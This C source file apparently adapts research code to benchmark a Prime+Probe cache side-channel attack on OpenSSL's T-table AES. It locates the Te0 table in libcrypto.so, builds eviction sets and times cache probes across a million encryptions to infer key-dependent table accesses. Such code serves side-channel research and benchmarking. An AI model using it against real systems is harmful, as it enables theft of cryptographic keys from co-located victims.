/**
 * This file is has been copied from xlate/aes-pp.c and been modified slightly in order to make it easier to benchmark the prime and probe algorithm
 */
#include "aes-pp-helper.h"

void *pp_crypto_find_te0(int file)
{
	Elf *elf;
	void *base;

	elf_version(EV_CURRENT);

	elf = elf_begin(file, ELF_C_READ, NULL);

	if (!(base = gelf_find_sym_ptr(elf, "Te0"))) {
		fprintf(stderr, "error: unable to find the 'Te0' symbol in "
			"libcrypto.so.\n\nPlease compile a version of OpenSSL with the "
			"T-table AES implementation enabled.\n");
		return NULL;
	}

	elf_end(elf);

	return base;
}

unsigned char pp_key_data[32] = { 0 };

unsigned char plain[16];
unsigned char cipher[128];
unsigned char restored[128];


static AES_KEY key;
struct page_set lines, wset;
int fd;
char *base;
char *te0;

int set_up_pp(char* libcrypto_path){
    struct stat stat;
    size_t size;

	if ((fd = open(libcrypto_path, O_RDONLY)) < 0) {
		perror("open");
		return -1;
	}

	if (!(te0 = pp_crypto_find_te0(fd)))
		return -1;

	if (fstat(fd, &stat) < 0) {
		fprintf(stderr, "error: unable to get the file size of libcrypto.so\n");
		return -1;
	}

	size = ALIGN_UP((size_t)stat.st_size, 4 * KIB);

	if ((base = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "error: unable to map libcrypto.so\n");
		return -1;
	}

	build_page_pool(&lines, 4096);

	AES_set_encrypt_key(pp_key_data, 128, &key);

	page_set_init(&wset, 16);
    return 1;
}

void execute_pp()
{
    uint64_t dt;
    static struct list set;
    char *cl;
    uintptr_t colour = 0;
    size_t round;
    size_t i, j;
    size_t byte;
    size_t nways = 16;

    for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64) {
		if (!colour || colour != ((uintptr_t)cl & ~(4 * KIB - 1))) {
			for (i = 0; i < wset.len; ++i) {
				page_set_push(&lines, wset.data[i]);
			}

			find_wset(&lines, &wset, NULL, cl, 16, prime_and_probe);
			limit_wset(&lines, &wset, nways);

			colour = ((uintptr_t)cl & ~(4 * KIB - 1));
		}

		page_set_link(&wset, &set, (size_t)cl & (4 * KIB - 1));

		struct timespec past, now;
		double diff;

		clock_gettime(CLOCK_MONOTONIC, &past);

		for (byte = 0; byte < 256; byte += 16) {
			plain[0] = byte;
			int64_t score = 0;

			prime(&set);

			for (round = 0; round < 1000000; ++round) {
				for (i = 1; i < 16; ++i) {
					plain[i] = rand() % 256;
				}

				AES_encrypt(plain, cipher, &key);
				sched_yield();

				dt = prime(&set);

				if (dt < 600)
					--score;

				if (dt > 750)
					++score;
			}

			printf("%" PRId64 " ", score);
			fflush(stdout);
		}

		clock_gettime(CLOCK_MONOTONIC, &now);

		diff = now.tv_sec + now.tv_nsec * .000000001;
		diff -= past.tv_sec + past.tv_nsec * .000000001;
		fprintf(stderr, "time: %.03lfs\n", diff);

		printf("\n");
	}
}

void clean_up_pp(){
	close(fd);
}
